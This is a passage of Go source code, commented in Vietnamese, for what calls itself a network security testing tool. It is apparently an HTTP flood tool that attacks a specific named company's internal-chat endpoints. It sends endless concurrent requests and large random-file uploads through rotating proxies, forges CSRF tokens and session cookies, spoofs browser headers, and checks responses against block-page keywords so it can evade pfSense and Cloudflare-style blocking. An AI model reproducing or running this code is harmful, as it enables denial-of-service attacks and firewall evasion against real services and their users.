			if rand.Float64() < 0.7 {
				req.Header.Set("X-Requested-With", "XMLHttpRequest")
			}

			if rand.Float64() < 0.5 {
				req.Header.Set("DNT", "1")
			}

			// Thêm các header đặc biệt để bypass pfSense
			req.Header.Set("Pragma", "no-cache")
		}

		// Nếu đã thử nhiều lần không thành công, thử đổi protocol
		if attempt >= 5 && config.Protocol == "https" {
			urlStr = fmt.Sprintf("http://%s:%s%s", config.TargetServer, config.TargetPort, endpoint)
			req, err = http.NewRequest("GET", urlStr, nil)
			if err != nil {
				fmt.Printf("Lỗi tạo HTTP request từ client %d: %v\n", clientID, err)
				continue
			}
			fmt.Printf("Client %d thử với HTTP thay vì HTTPS (lần %d): %s\n", clientID, attempt+1, urlStr)
		}

		// Bắt đầu đo thời gian
		startTime := time.Now()

		// Gửi request
		resp, err := client.Do(req)
		if err != nil {
			// Chuyển proxy vào blacklist tạm thời nếu có lỗi và đang sử dụng proxy
			if usingProxy && proxy.IP != "" {
				blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
				fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n",
					proxy.IP, proxy.Port, blacklistTime)
				proxyPool.disableProxy(proxy, blacklistTime)
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", proxy.IP, proxy.Port)
			}

			fmt.Printf("Lỗi khi gửi GET từ client %d: %v\n", clientID, err)
			continue
		}

		// Đọc và đóng response body
		_, err = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Lỗi khi đọc response body từ client %d: %v\n", clientID, err)
			continue
		}

		// Tính thời gian đã trôi qua
		elapsed := time.Since(startTime)
		atomic.AddInt64(&stats.totalResponseTime, elapsed.Milliseconds())

		// Kiểm tra có bị chặn không
		if config.PfSenseBypass {
			bodyLower := strings.ToLower(string("")) // Không cần nội dung thực tế vì không sử dụng

			// Kiểm tra các dạng chặn khác nhau
			blockTerms := []string{
				"access denied", "geo", "location", "block", "restricted",
				"not available", "unavailable", "forbidden", "banned",
				"country", "region", "unauthorized", "firewalled",
				"vpn detected", "proxy detected", "cloudflare",
			}

			isBlocked := false
			for _, term := range blockTerms {
				if strings.Contains(bodyLower, term) {
					isBlocked = true
					fmt.Printf("❌ Client %d bị chặn: Phát hiện '%s' trong response\n", clientID, term)
					break
				}
			}

			// Nếu status code là 403, 429 hoặc chuỗi bị chặn được tìm thấy
			if resp.StatusCode == 403 || resp.StatusCode == 429 || isBlocked {
				atomic.AddInt64(&stats.blockedRequests, 1)
				fmt.Printf("❌ Client %d bị chặn: Status code %d\n", clientID, resp.StatusCode)

				// Đánh dấu proxy này có vấn đề nếu đang sử dụng proxy
				if usingProxy && proxy.IP != "" {
					blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
					proxyPool.disableProxy(proxy, blacklistTime)
					fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist do bị chặn\n", proxy.IP, proxy.Port)
				}
				continue
			}
		}

		// Thành công!
		fmt.Printf("Client %d (GET) nhận phản hồi: %s\n", clientID, resp.Status)

		// Tăng số lượng request thành công
		atomic.AddInt64(&stats.successfulRequests, 1)
		if usingProxy {
			atomic.AddInt64(&stats.proxyRequests, 1)
		} else {
			atomic.AddInt64(&stats.directRequests, 1)
		}

		success = true
	}

	if !success {
		fmt.Printf("⚠️ Client %d đã hết số lần thử, không thể kết nối\n", clientID)
		atomic.AddInt64(&stats.failedRequests, 1)
	}
}

// Cải thiện việc hiển thị thống kê
func printStats(stats *Stats, startTime time.Time, proxyPool *ProxyPool, config *Config) {
	// Tính thời gian đã trôi qua
	elapsed := time.Since(startTime)
	elapsedSeconds := float64(elapsed) / float64(time.Second)

	// Tính toán tốc độ
	requestsPerSecond := float64(stats.totalRequests) / elapsedSeconds
	successPerSecond := float64(stats.successfulRequests) / elapsedSeconds

	// Tính tỷ lệ thành công
	var successRate float64 = 0
	if stats.totalRequests > 0 {
		successRate = float64(stats.successfulRequests) / float64(stats.totalRequests) * 100
	}

	// Tính thời gian phản hồi trung bình
	var avgResponseTime float64 = 0
	if stats.successfulRequests > 0 {
		avgResponseTime = float64(stats.totalResponseTime) / float64(stats.successfulRequests)
	}

	// Tính số lượng proxy khả dụng và điểm trung bình
	availableProxies := 0
	totalProxies := 0
	totalScore := 0.0

	if proxyPool != nil {
		proxyPool.mutex.Lock()
		for _, p := range proxyPool.proxies {
			totalProxies++
			if !p.disabled {
				availableProxies++
				totalScore += p.score
			}
		}
		proxyPool.mutex.Unlock()
	}

	var avgScore float64 = 0
	if availableProxies > 0 {
		avgScore = totalScore / float64(availableProxies)
	}

	// In thông tin thống kê
	fmt.Printf("\n📊 === ADVANCED NETWORK SECURITY TESTING TOOL V4.0 === 📊\n")
	fmt.Printf("⏱️  Thời gian: %s | Tốc độ: %.1f req/s (%.1f success/s)\n",
		formatDuration(elapsed), requestsPerSecond, successPerSecond)
	fmt.Printf("📊 Tổng requests: %d | Thành công: %d (%.1f%%)\n",
		stats.totalRequests, stats.successfulRequests, successRate)
	fmt.Printf("❌ Lỗi: %d | Timeout: %d | Blocked: %d\n",
		stats.failedRequests, stats.timeoutRequests, stats.blockedRequests)
	fmt.Printf("🔗 Proxy: %d | Direct: %d\n",
		stats.proxyRequests, stats.directRequests)
	fmt.Printf("⚡ Thời gian phản hồi TB: %.1fms\n", avgResponseTime)
	fmt.Printf("🌐 Proxy Pool: %d/%d khả dụng (avg score: %.2f)\n",
		availableProxies, totalProxies, avgScore)
	fmt.Printf("💾 Goroutines: %d\n", stats.activeGoroutines)
	fmt.Println("======================================================")
}

// Hàm định dạng thời gian
func formatDuration(d time.Duration) string {
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second

	if h > 0 {
		return fmt.Sprintf("%dh%dm%ds", h, m, s)
	}
	return fmt.Sprintf("%dm%ds", m, s)
}

// Hàm gửi file upload request
func sendFileUploadRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool, config *Config) {
	defer wg.Done()

	// Đánh dấu đã gọi hàm này
	atomic.AddInt64(&stats.totalRequests, 1)
	atomic.AddInt32(&stats.activeGoroutines, 1)
	defer atomic.AddInt32(&stats.activeGoroutines, -1)

	// Quyết định giữa proxy và kết nối trực tiếp dựa trên tỷ lệ cấu hình
	var client *http.Client
	var proxy Proxy
	var usingProxy bool
	var proxySuccess bool

	// Quyết định sử dụng proxy hay kết nối trực tiếp
	if proxyPool != nil && len(proxyPool.proxies) > 0 && rand.Float64() > config.UseDirectRatio {
		proxy, proxySuccess = proxyPool.getAvailableProxyWithCountryPreference(config.PreferredCountries)
		if proxySuccess {
			var err error
			client, err = createProxyClient(proxy)
			if err != nil {
				fmt.Printf("Lỗi tạo proxy client: %v - Chuyển sang kết nối trực tiếp\n", err)
				client = createHttpClient(config)
			} else {
				usingProxy = true
				fmt.Printf("Client %d đang sử dụng proxy: %s:%s (File Upload)\n", clientID, proxy.IP, proxy.Port)
			}
		} else {
			client = createHttpClient(config)
			fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật) (File Upload)\n", clientID)
		}
	} else {
		client = createHttpClient(config)
		fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật) (File Upload)\n", clientID)
	}

	// Tăng timeout cho client để xử lý file lớn
	client.Timeout = time.Duration(config.TimeoutMs*config.FileUploadTimeoutMultiplier) * time.Millisecond

	// Tạo URL dựa trên protocol
	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)

	var attempt int
	success := false

	// Vòng lặp thử lại khi lỗi
	for attempt = 0; attempt < config.MaxRetries && !success; attempt++ {
		// Nếu không phải là lần thử đầu tiên, chờ một khoảng thời gian trước khi thử lại
		if attempt > 0 {
			var delay time.Duration
			if config.RandomTiming {
				// Thêm jitter ngẫu nhiên vào delay
				jitter := rand.Intn(config.TimingJitterMs*2) - config.TimingJitterMs
				delay = time.Duration(config.DelayMs+jitter) * time.Millisecond
			} else {
				delay = time.Duration(config.DelayMs) * time.Millisecond
			}

			fmt.Printf("Client %d: Đợi %v trước khi thử lại lần %d (File Upload)\n", clientID, delay, attempt+1)
			time.Sleep(delay)
		}

		// Tạo multipart form data với buffer lớn hơn
		var b bytes.Buffer
		w := multipart.NewWriter(&b)

		// Tạo dữ liệu giả cho file - sử dụng cách tiết kiệm bộ nhớ
		fileSize := config.FileUploadSizeMB * 1024 * 1024 // Convert MB to bytes
		chunkSize := config.FileUploadChunkSize           // Sử dụng kích thước chunk từ cấu hình

		// Tạo file part
		fw, err := w.CreateFormFile("file", fmt.Sprintf("test_file_%d.dat", clientID))
		if err != nil {
			fmt.Printf("Lỗi tạo form file từ client %d: %v\n", clientID, err)
			continue
		}

		// Ghi dữ liệu theo từng chunk để tiết kiệm bộ nhớ
		chunk := make([]byte, chunkSize)
		bytesWritten := 0

		for bytesWritten < fileSize {
			// Tạo dữ liệu ngẫu nhiên cho chunk
			rand.Read(chunk)

			// Tính toán kích thước cần ghi
			writeSize := chunkSize
			if bytesWritten+writeSize > fileSize {
				writeSize = fileSize - bytesWritten
			}

			// Ghi chunk
			if _, err = fw.Write(chunk[:writeSize]); err != nil {
				fmt.Printf("Lỗi ghi dữ liệu file từ client %d: %v\n", clientID, err)
				break
			}

			bytesWritten += writeSize
		}

		if err != nil {
			continue
		}

		// Thêm các trường form khác
		if fw, err = w.CreateFormField("chat_id"); err != nil {
			fmt.Printf("Lỗi tạo trường chat_id từ client %d: %v\n", clientID, err)
			continue
		}
		if _, err = fw.Write([]byte(fmt.Sprintf("%d", 1000+rand.Intn(9000)))); err != nil {
			fmt.Printf("Lỗi ghi dữ liệu chat_id từ client %d: %v\n", clientID, err)
			continue
		}

		// Đóng multipart writer
		w.Close()

		// Tạo request
		req, err := http.NewRequest("POST", urlStr, &b)
		if err != nil {
			fmt.Printf("Lỗi tạo POST request từ client %d: %v\n", clientID, err)
			continue
		}

		// Thêm các header cần thiết
		req.Header.Set("Content-Type", w.FormDataContentType())
		req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36")
		req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,vi;q=0.8")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
		req.Header.Set("Origin", "https://support.trianh.vn")
		req.Header.Set("Referer", "https://support.trianh.vn/internal-chat/index")
		req.Header.Set("sec-ch-ua", "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"")
		req.Header.Set("sec-ch-ua-mobile", "?1")
		req.Header.Set("sec-ch-ua-platform", "\"Android\"")
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("x-requested-with", "XMLHttpRequest")

		// Tạo CSRF token ngẫu nhiên
		csrfToken := generateRandomString(64)
		req.Header.Set("x-csrf-token", csrfToken)

		// Tạo cookie
		cookieValue := fmt.Sprintf("_ga=GA1.1.%d.%d; _ga_BGKJH6NJEZ=GS2.1.%d.%d.%d; PHPSESSID=%s; _csrf=%s; language=%s; _ga_CLEY0P5671=GS2.1.%d.%d.%d",
			100000000+rand.Intn(900000000),
			time.Now().Unix()-int64(rand.Intn(10000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			generateRandomString(26),
			generateRandomHexString(96),
			generateRandomHexString(96),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)))
		req.Header.Set("Cookie", cookieValue)

		// Bắt đầu đo thời gian
		startTime := time.Now()

		// Gửi request
		resp, err := client.Do(req)
		if err != nil {
			// Chuyển proxy vào blacklist tạm thời nếu có lỗi và đang sử dụng proxy
			if usingProxy && proxy.IP != "" {
				blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
				fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi (File Upload)\n",
					proxy.IP, proxy.Port, blacklistTime)
				proxyPool.disableProxy(proxy, blacklistTime)
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", proxy.IP, proxy.Port)
			}

			fmt.Printf("Lỗi khi gửi POST từ client %d: %v\n", clientID, err)
			continue
		}

		// Đọc và đóng response body
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Lỗi khi đọc response body từ client %d: %v\n", clientID, err)
			continue
		}

		// Tính thời gian đã trôi qua
		elapsed := time.Since(startTime)
		atomic.AddInt64(&stats.totalResponseTime, elapsed.Milliseconds())

		// Kiểm tra phản hồi
		fmt.Printf("Client %d (POST) nhận phản hồi: %s, Kích thước file: %dMB, Thời gian: %v\n",
			clientID, resp.Status, config.FileUploadSizeMB, elapsed)

		if resp.StatusCode == 200 {
			fmt.Printf("✅ Client %d upload file thành công: %s\n", clientID, string(body))

			// Tăng số lượng request thành công
			atomic.AddInt64(&stats.successfulRequests, 1)
			if usingProxy {
				atomic.AddInt64(&stats.proxyRequests, 1)
			} else {
				atomic.AddInt64(&stats.directRequests, 1)
			}

			success = true
		} else {
			fmt.Printf("❌ Client %d upload file thất bại: %s - %s\n", clientID, resp.Status, string(body))
		}
	}

	if !success {
		fmt.Printf("⚠️ Client %d đã hết số lần thử, không thể upload file\n", clientID)
		atomic.AddInt64(&stats.failedRequests, 1)
	}
}

// Tạo chuỗi ngẫu nhiên có độ dài xác định
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Tạo chuỗi hex ngẫu nhiên
func generateRandomHexString(length int) string {
	const charset = "0123456789abcdef"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Hàm chính để chạy các request
func main() {
	// Khởi tạo random seed
	rand.Seed(time.Now().UnixNano())

	// Đọc cấu hình từ file
	config, err := loadConfig("config.txt")
	if err != nil {
		fmt.Printf("Lỗi khi đọc cấu hình: %v\n", err)
	}

	// Đọc danh sách proxy từ file
	proxyPool, err := loadProxies("proxies.txt")
	if err != nil {
		fmt.Printf("Lỗi khi đọc proxy: %v\n", err)
		fmt.Println("Tiếp tục với kết nối trực tiếp...")
	}

	// Khởi tạo thống kê
	var stats Stats

	// Thời điểm bắt đầu
	startTime := time.Now()
	lastStatTime := time.Now()

	// Khởi tạo goroutines để gửi request
	var wg sync.WaitGroup
	clientID := 0

	for {
		// Kiểm tra nếu đã đạt đến số lượng goroutine tối đa
		if int(stats.activeGoroutines) >= config.MaxConcurrent {
			time.Sleep(10 * time.Millisecond)
			continue
		}

		// Tăng ID client
		clientID++

		// Chọn endpoint ngẫu nhiên
		endpoint := config.Endpoints[rand.Intn(len(config.Endpoints))]

		// Quyết định xem có sử dụng upload file hay không
		useFileUpload := config.EnableFileUpload &&
			endpoint == "/internal-chat/send-file" &&
			rand.Float64() < config.FileUploadRatio

		wg.Add(1)

		if useFileUpload {
			go sendFileUploadRequest(endpoint, clientID, &stats, &wg, proxyPool, config)
		} else {
			go sendHTTPRequest(endpoint, clientID, &stats, &wg, proxyPool, config)
		}

		// Thêm delay nhỏ giữa các lần khởi tạo goroutine
		time.Sleep(time.Duration(config.DelayMs) * time.Millisecond)

		// In thống kê sau mỗi 5 giây
		if time.Since(lastStatTime) > 5*time.Second {
			printStats(&stats, startTime, proxyPool, config)
			lastStatTime = time.Now()
		}
	}
}
